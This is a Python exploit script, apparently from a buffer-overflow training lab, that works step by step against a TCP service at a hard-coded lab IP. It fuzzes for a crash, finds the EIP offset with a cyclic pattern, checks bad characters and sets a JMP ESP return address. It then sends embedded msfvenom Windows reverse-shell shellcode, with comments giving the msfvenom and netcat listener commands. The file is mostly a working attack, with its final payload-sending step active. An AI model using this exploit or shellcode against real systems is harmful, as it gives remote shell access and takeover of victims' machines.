#!/usr/bin/python3 
# Test the server with the data that crashed it
# Before running these scripts, it could be possible to use SPIKE to identify if the application is vulnerable to a BoF
# To do so, create the spike scripts to be used with the  generic_tcp_send 
# generic_tcp_send [host] [port] [spike_script] [SKIPVAR] [SKIPSTR]
# check basic.spk or 0Help.spk to see how it works or https://shahrukhathar.info/an-introduction-to-fuzzing-using-fuzzers-spike-to-find-vulnerabilities/
# In case you need to convert from string to bytes use: bytes(test_string, 'utf-8')
# Inverse way: myvar.decode("utf-8")
import socket
import time 
import sys
import struct

#Function to send a message for a previously created socket
def send_msg(s, msg):
    s.send(msg) 

# Creates a connection to the host and port defined globally
def make_con():
    try:
        print("Creating the socket")
        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Establishing the connection to %s on port %s" % (host,port))
        # Both parenthesis are required
        s.connect((host, port)) 
        return s
    except Exception as err:
        print ("Error while creating  socket: ")
        print (str(err))
        sys.exit() 

#Fnction to send a payload. It is used by all
def send_payload(payload):
    try:
        s = make_con()
        print("Sending the payload size {} ...".format(len(payload)))
        s.send(payload) 
        #print("Receiving the data")
        s.close() 
    except Exception as err:
        print ("Send payload crashed: ")
        print (str(err))
        sys.exit() 

# Function created to send POP3 messages 
def send_pop(payload):
    try:
        s = make_con()
        data = s.recv(1024)
        print("Answer received: ",data)
        s.send(b"USER test\r\n") 
        data = s.recv(1024)
        print("Received: ", data)
        s.send(b"PASS "+payload) 
        print("Received: ",data)
        s.close() 
    except Exception as err:
        print ("Send pop crashed: ")
        print (str(err))
        sys.exit() 


def send_payload_and_read(payload):
    try:
        s = make_con()
        print("Sending the payload size {} ...".format(len(payload)))
        s.send(payload) 
        print("Receiving the data...")
        data = s.recv(100)
        print(data)
    except Exception as err:
        print ("Send and read crashed: ")
        print (str(err))
        sys.exit() 

#Save the payload to a file
def save_payload(payload, filename):
    try:
        #Payload can be saved to a file in case it is required:
        with open(filename, 'wb') as f:
            f.write(payload)
            f.close()
    except Exception as err:
        print ("Problem saving file ",filename)
        print (str(err))


#Test 1 to fuzz a connection
def fuzz(command, size, gap, max=100000):
    #Initial size to start looking where the server dies 
    #size = 100
    # 1. Finding the approximated size that cause the overflow
    # This is the initial part to identify how many chars can cause an overflow
    # This part can be used if SPIKE was not used to identify if the application crashes
    # If the EIP in the server contains 41414141 (AAAA) this means it is possible to be manipulated
    while (True):
        print ("\nFuzzing system with %s bytes" % size )
        payload = command + b"A"*size + b"\n" 
        # Replaces this line with the data you want to send to the server after the connection is established
        send_payload_and_read(payload)
        #send_pop(payload)
        time.sleep(1)
        size+=gap

#Test 4 - Check badchars
# Download it from https://github.com/corelan/mona and copy the file into Immunity Debugger\PyCommands
#!mona bytearrays (Immunity)
#ERC --bytearray  and ERC --compare after sending to identify bad characters x32dbg/x64dbg)
def remove_badchars(badchars):
    # 4. Checking for badchars (not accepted by the server)
    # Check the stack after sending the payload
    allchars = [b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f', b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f', b'\x20', b'\x21', b'\x22', b'\x23', b'\x24', b'\x25', b'\x26', b'\x27', b'\x28', b'\x29', b'\x2a', b'\x2b', b'\x2c', b'\x2d', b'\x2e', b'\x2f', b'\x30', b'\x31', b'\x32', b'\x33', b'\x34', b'\x35', b'\x36', b'\x37', b'\x38', b'\x39', b'\x3a', b'\x3b', b'\x3c', b'\x3d', b'\x3e', b'\x3f', b'\x40', b'\x41', b'\x42', b'\x43', b'\x44', b'\x45', b'\x46', b'\x47', b'\x48', b'\x49', b'\x4a', b'\x4b', b'\x4c', b'\x4d', b'\x4e', b'\x4f', b'\x50', b'\x51', b'\x52', b'\x53', b'\x54', b'\x55', b'\x56', b'\x57', b'\x58', b'\x59', b'\x5a', b'\x5b', b'\x5c', b'\x5d', b'\x5e', b'\x5f', b'\x60', b'\x61', b'\x62', b'\x63', b'\x64', b'\x65', b'\x66', b'\x67', b'\x68', b'\x69', b'\x6a', b'\x6b', b'\x6c', b'\x6d', b'\x6e', b'\x6f', b'\x70', b'\x71', b'\x72', b'\x73', b'\x74', b'\x75', b'\x76', b'\x77', b'\x78', b'\x79', b'\x7a', b'\x7b', b'\x7c', b'\x7d', b'\x7e', b'\x7f', b'\x80', b'\x81', b'\x82', b'\x83', b'\x84', b'\x85', b'\x86', b'\x87', b'\x88', b'\x89', b'\x8a', b'\x8b', b'\x8c', b'\x8d', b'\x8e', b'\x8f', b'\x90', b'\x91', b'\x92', b'\x93', b'\x94', b'\x95', b'\x96', b'\x97', b'\x98', b'\x99', b'\x9a', b'\x9b', b'\x9c', b'\x9d', b'\x9e', b'\x9f', b'\xa0', b'\xa1', b'\xa2', b'\xa3', b'\xa4', b'\xa5', b'\xa6', b'\xa7', b'\xa8', b'\xa9', b'\xaa', b'\xab', b'\xac', b'\xad', b'\xae', b'\xaf', b'\xb0', b'\xb1', b'\xb2', b'\xb3', b'\xb4', b'\xb5', b'\xb6', b'\xb7', b'\xb8', b'\xb9', b'\xba', b'\xbb', b'\xbc', b'\xbd', b'\xbe', b'\xbf', b'\xc0', b'\xc1', b'\xc2', b'\xc3', b'\xc4', b'\xc5', b'\xc6', b'\xc7', b'\xc8', b'\xc9', b'\xca', b'\xcb', b'\xcc', b'\xcd', b'\xce', b'\xcf', b'\xd0', b'\xd1', b'\xd2', b'\xd3', b'\xd4', b'\xd5', b'\xd6', b'\xd7', b'\xd8', b'\xd9', b'\xda', b'\xdb', b'\xdc', b'\xdd', b'\xde', b'\xdf', b'\xe0', b'\xe1', b'\xe2', b'\xe3', b'\xe4', b'\xe5', b'\xe6', b'\xe7', b'\xe8', b'\xe9', b'\xea', b'\xeb', b'\xec', b'\xed', b'\xee', b'\xef', b'\xf0', b'\xf1', b'\xf2', b'\xf3', b'\xf4', b'\xf5', b'\xf6', b'\xf7', b'\xf8', b'\xf9', b'\xfa', b'\xfb', b'\xfc', b'\xfd', b'\xfe', b'\xff']
    print("Length allchars: ", len(allchars))
    for item in badchars:
        allchars.remove(item)
    goodchars=b"".join(allchars)
    return goodchars

#Test 5 shell exploit
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a" #include the badchars
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f python -b "\x00\x07\x2e\xa0" -v shellcode
def get_shell_exploit(numnops):
    # Before running this code, we need to run a nc in the kali Linux to get the reverse shell: sudo nc -lnvp 443
    shellcode =  b""
    shellcode += b"\xfc\xbb\x38\x3b\x88\xa3\xeb\x0c\x5e\x56\x31"
    shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
    shellcode += b"\xff\xff\xff\xc4\xd3\x0a\xa3\x34\x24\x6b\x2d"
    shellcode += b"\xd1\x15\xab\x49\x92\x06\x1b\x19\xf6\xaa\xd0"
    shellcode += b"\x4f\xe2\x39\x94\x47\x05\x89\x13\xbe\x28\x0a"
    shellcode += b"\x0f\x82\x2b\x88\x52\xd7\x8b\xb1\x9c\x2a\xca"
    shellcode += b"\xf6\xc1\xc7\x9e\xaf\x8e\x7a\x0e\xdb\xdb\x46"
    shellcode += b"\xa5\x97\xca\xce\x5a\x6f\xec\xff\xcd\xfb\xb7"
    shellcode += b"\xdf\xec\x28\xcc\x69\xf6\x2d\xe9\x20\x8d\x86"
    shellcode += b"\x85\xb2\x47\xd7\x66\x18\xa6\xd7\x94\x60\xef"
    shellcode += b"\xd0\x46\x17\x19\x23\xfa\x20\xde\x59\x20\xa4"
    shellcode += b"\xc4\xfa\xa3\x1e\x20\xfa\x60\xf8\xa3\xf0\xcd"
    shellcode += b"\x8e\xeb\x14\xd3\x43\x80\x21\x58\x62\x46\xa0"
    shellcode += b"\x1a\x41\x42\xe8\xf9\xe8\xd3\x54\xaf\x15\x03"
    shellcode += b"\x37\x10\xb0\x48\xda\x45\xc9\x13\xb3\xaa\xe0"
    shellcode += b"\xab\x43\xa5\x73\xd8\x71\x6a\x28\x76\x3a\xe3"
    shellcode += b"\xf6\x81\x3d\xde\x4f\x1d\xc0\xe1\xaf\x34\x07"
    shellcode += b"\xb5\xff\x2e\xae\xb6\x6b\xae\x4f\x63\x3b\xfe"
    shellcode += b"\xff\xdc\xfc\xae\xbf\x8c\x94\xa4\x4f\xf2\x85"
    shellcode += b"\xc7\x85\x9b\x2c\x32\x4e\xae\xb9\x3e\x62\xc6"
    shellcode += b"\xbb\x3e\x6b\xc0\x35\xd8\xe1\xfe\x13\x73\x9e"
    shellcode += b"\x67\x3e\x0f\x3f\x67\x94\x6a\x7f\xe3\x1b\x8b"
    shellcode += b"\xce\x04\x51\x9f\xa7\xe4\x2c\xfd\x6e\xfa\x9a"
    shellcode += b"\x69\xec\x69\x41\x69\x7b\x92\xde\x3e\x2c\x64"
    shellcode += b"\x17\xaa\xc0\xdf\x81\xc8\x18\xb9\xea\x48\xc7"
    shellcode += b"\x7a\xf4\x51\x8a\xc7\xd2\x41\x52\xc7\x5e\x35"
    shellcode += b"\x0a\x9e\x08\xe3\xec\x48\xfb\x5d\xa7\x27\x55"
    shellcode += b"\x09\x3e\x04\x66\x4f\x3f\x41\x10\xaf\x8e\x3c"
    shellcode += b"\x65\xd0\x3f\xa9\x61\xa9\x5d\x49\x8d\x60\xe6"
    shellcode += b"\x69\x6c\xa0\x13\x02\x29\x21\x9e\x4f\xca\x9c"
    shellcode += b"\xdd\x69\x49\x14\x9e\x8d\x51\x5d\x9b\xca\xd5"
    shellcode += b"\x8e\xd1\x43\xb0\xb0\x46\x63\x91\xb0\x68\x9b"
    shellcode += b"\x1a"


    # nops are just like go to the next memmory address.
    nops = b"\x90"*numnops
    result = nops + shellcode
    print("Lenght shellcode + nops: ",len(result))
    return result




# Replace it with the server address
host = "10.10.140.196"
# Replace this with the desired port
port=9999

# Test 0. Testing the connection. Modify send_payload or create a new method based on it as required
# Initial test to check the server receives the comm
#payload = b"TRUN /.:/" + "A"*800
command = b""
payload = b"Test"+b"\n"
print("T0 Preparing initial message with %s chars" % len(command+payload))
#send_payload_and_read(command+payload)
#send_pop(payload)
print("T0 Initial message sent successfully")
print("************************************")


#Test 1 - check if the program stops at any buffer size
#command = b"TRUN /.:/"
initial_size=500
gap = 100
max=10000
#Loop to identify where the program crashes
print("T1 Running loop from %s gaps of %s" % (initial_size,gap))
print("T1 try to identify when the ap crash and enter ctrl-C to stop" )
#fuzz(command, initial_size, gap,max)
## Died with 
sizetodie = 600
## Now confirm if this sizetodie of payload kill the server (based on the previous result) Comment line 180 fuzz(..) 
## Restart the program in Immunity using ctrl+F2
payload = b"A"*sizetodie+b"\n"
print("T1 Validating app dies with a size of %s" % (sizetodie))
#send_payload_and_read(command+payload)
print("T1 Initial message sent successfully")
print("************************************")


##Test 2
## 2. Finding the exact offset where the EIP is replaced and other pointers that could be modified
## We need to generate a sequence of "random" chars to identify where it happens
## !mona ????   
## Kali: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 3500 or 
##       msf-pattern_create -l 3500
## In x64dbg command: ERC --pattern c 3500 => it should be 2900
totalsize = sizetodie + 500
##This string contains 3500 chars:
pattern = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em") 
subpattern = bytes(pattern[0:totalsize],"utf-8")
payload= command + subpattern + b"\n"
print("T2 Checking registers values with a patter of size %s" % (totalsize))
#send_payload_and_read(payload)
print("T2 Initial message sent successfully")
print("T2 Run: !mona findmsp -distance %s" % totalsize)
print("************************************")
## After running this part, all the pointers, especially the EIP should be checked to see what we can control. 
## To identify the offset:
## !mona findmsp -distance 1200  => will return offset for EIP and ESP and its length (to understand if the payload has enough space to inject the shellcode) or
##       /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q [VALUE]
##       In x64dbg command: ERC --pattern o [value_in_ascii]  to get the exact offset 
##       To get the ascii value, I had to enter it as "\x01\x02..." (address obtained) using python3 cmd line to get the ascii or in right click, modify in x64dbg to get the ASCII representation
## Values gathered:
## EIP: Offset 524
## ESP: offset 528, length 472 => Great to insert the shell
## EBP: 520
## EDX: 0022f4e4
## Check how this part is organized and adjust the code below to send this same info
## payload = 519*"A" + "Z" + ebp + eip + esp + shell 

#Test Test 3 Confirm control over some registers
# Once the offset is identified include here the size obtained from the pattern offset 
# Check it is working by running this part and validating EIP becomes CCCC (43434343)
offset = 520   #Value identified in the previous step to the shortest register
# Z to identify if it is little indian. 
textpattern = b"A"*(offset-1)+b"Z"
# Here the value we want to assign to the registers we want to validate
ebx = b"NNNN"   #42424242
ebp = b"CCCC"   #43434343
eip = b"DDDD"   #44444444
esp = b"EEEE"   #45454545
#espcontentsize = totalsize-len(command)-len(textpattern)-len(ebx)-len(ebp)-len(eip)  #2500-11-1970-4-4-4=507 
espcontentsize = totalsize-len(command)-len(textpattern)-len(ebp)-len(eip)  #2500-11-1970-4-4-4=507 
espcontent = esp+b"F"*(espcontentsize-4)
# Organise the payload according to the observed values
print("T3 Checking registers values with an offset of %s" % (offset))
initialchars = command + textpattern + ebp
payload =  initialchars + eip + espcontent + b"\n"
#send_payload_and_read(payload)
# After sending the message it was observed the EIP has EKIM as value due to the little indian notation
print("T3 Check registers to validate they are as expected:")
#print("T3 EBX:%s" % ebx)
print("T3 EBP:%s" % ebp)
print("T3 EIP:%s" % eip)
print("T3 ESP points to: %s" % esp)
print("************************************")


#Test 4 check_badchars
# This part is used to identify if the server accepts all the values or if there are any "badchar" to avoid its use
# !mona config -set workingfolder c:\mona\%p  #creates a folder with the name of the debugged program
# Prepares the bytearray to check the bad characters:
# !mona bytearray   #store it in 2 files: bytearray.bin and .txt
# Run the program below and then check the badchars with another mona command
# Do not include \x00 in badchars
print("T4 Checking Badchars")
badchars = []
#badchars = [b'\x11',b'\x40',b'\x5f',b'\xb8',b'\xee']   #"\x00\x11\x40\x5f\xb8\xee"
#badchars="\\x23\\x3c\\x83\\xba".split("\\x")
# Creates an array without the badchars 
goodchars = remove_badchars(badchars)
print("T4 Length goodchars: ", len(goodchars))
espsize = 518   #This value is taken from mona analysis. Normal size of the shell we want to inject is 351.
espcontent = goodchars + b"X"*(espsize-len(goodchars))
payload = initialchars + eip + espcontent + b"\n"
print("T4 Lenght of payload: ", len(payload))
print("T4 Sending new payload")
#send_payload_and_read(payload)
print("T4 Message sent successfully")
print("T4 Run this command to set the working dir \%p means program name subdir: ")
print ("    !mona config -set workingfolder c:\\mona\\")
print("T4 Then run this command to create the array ro compare for badchars. Continue adding badchars each time:")
print("    !mona bytearray -b \"\\x00\" to create the array to compare")
print("T4 Then compare to identify no more badchars or continue adding until Horay message is got:")
print("    !mona compare -f C:\\mona\\bytearray.bin -a [ESP_Pointed_Address]   => Take care address could change each time")
print("T4 completed successfully")
print("************************************")
# After running the program, this will validate bad chars:
# Create the array removing badchars identified (one by one)
# !mona bytearray -b "\x00\x07\x2e\xa0"
# Compare it with the ESP
# !mona compare -f C:\mona\bytearray.bin -a [ESP_Pointed_Address]  => ESP address could change each time. Results  are possible badchars but it is required to test them manually
# Once it is OK, a Hooray message should be showed


#Test 5 shell exploit 
# We have: EIP control, ESP Control (where we are going to left the shell (ESP value)
# We need: command to run and address where it can be found
# In kali the opcode can be obtained with msf-nasm_shell
#       >JMP ESP  => FFE4
# Look for JMP ESP ("\xff\xe4") in the insecure modules 
# In mona run this command excluding badchars identified to identify the module that can be used to call the desired opcode:
# !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
# ////NOT =>!mona modules # to identify insecure modules ASLR false. It also cannot contain any bad characters in its base range.
# ////NOT =>!mona find -s "\xff\xe4" -m "modulename.dll"   # To identify the address with JMP ESP. It should not contain badchars. Could be JMP AIX, CALL EBP or any other depending where the shellcode is located
# In x64dbg use the command ERC --ModuleInfo  and then go to symbols (alt+e), select any of the dll or exe files by double clicking it. Then ctrl+f to search the required instruction jmp esp
# Pick an address that does not contain identified badchars. This address should be assigned to the EIP
    # We need to find an address where the wanted op (i.e. JMP ESP) can be found to direct the EIP to there
    # In x64dbg 
    # Look for JMP ESP ("\xff\xe4") in the insecure modules identified ("essfunc.dll" in this case)
print("T5 Including shell in the payload")
print("T5 If ESP points to the content we have control of, then we need to point EIP to an instruction having JMP ESP")
print("T5 run: !mona jmp -r esp -cpb \"BADCHARLIST\" and check in the log window for an address to use as EIP")
print("T5 Assign EIP that address in little indian")
##Address we want to point in little indian (inverse order) 0x311712f3 is now:
eip = b"\xf3\x12\x17\x31"
##This calculates little indian automatically
##eip = struct.pack('<L', 0x625011af) => this was not working
print("T5 EIP: ",eip," Size: ", len(eip))
## nops are just like go to the next memmory address. Add some (check you are not overpassing the bytes limit)
numnops = 16
print("T5 create a shellcode using msfvenom and IP of kali and without badchars")
print("     msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=4567 EXITFUNC=thread -f python -v shellcode -b \"BADCHARSLIST\" ")
print("T5 Add the code to the shell method above")
print("T5 start nc in a different window:  nc -lnvp 4567")
# Create the shellcode without the badchars
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f python -b "\x00\x07\x2e\xa0" -v shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x07\x08\x0a\x0d\x2e\x2f\xa0"
# copy the shell in the method get_shell_exploit method
# Run nc to get the reverse shell: sudo nc -lnvp 443  #sudo if the port is lesser than 1024
shellcode = get_shell_exploit(numnops)
print ("Preparing the string with the reverse shell.")
numcharsafter = totalsize-len(initialchars)-len(shellcode)
print ("T5 Chars before shellcode: ",len(initialchars))
print ("T5 Chars after shellcode: ",numcharsafter)
charsafter = b""
if (numcharsafter>0):
    charsafter = b"G"*numcharsafter
##payload = initialchars + espcontent + b"\n"
payload = initialchars + eip + shellcode + charsafter + b"\n"
print("T5 Lenght payload: ", len(payload))
print("Sending the payload")
send_payload_and_read(payload)
print("T5 completed successfully")
print("************************************")

